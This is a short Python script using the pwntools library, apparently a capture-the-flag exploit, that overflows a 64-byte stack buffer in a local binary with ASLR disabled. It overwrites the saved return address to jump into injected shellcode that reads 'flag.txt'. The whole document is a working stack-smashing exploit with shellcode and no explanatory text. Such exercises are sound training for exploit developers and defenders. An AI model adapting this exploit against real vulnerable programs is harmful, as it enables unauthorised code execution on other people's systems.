from pwn import *

context.arch = 'amd64'

gen_filename = ""

e = ELF(gen_filename)
p = process([], env={}, executable=gen_filename, aslr=False)

# this assumes no aslr
stack_base = 0x7ffffffde000
buff = stack_base + 0x20d40

payload = b''
payload += 64 * b'a'  # buffer
payload +=  8 * b'b'  # rbp
dest = buff + len(payload) + 8
payload += p64(dest)  # rip
shellcode = shellcraft.amd64.linux.cat("flag.txt") + shellcraft.amd64.linux.exit(0)
payload += asm(shellcode)
p.sendline(payload)

p.stream()

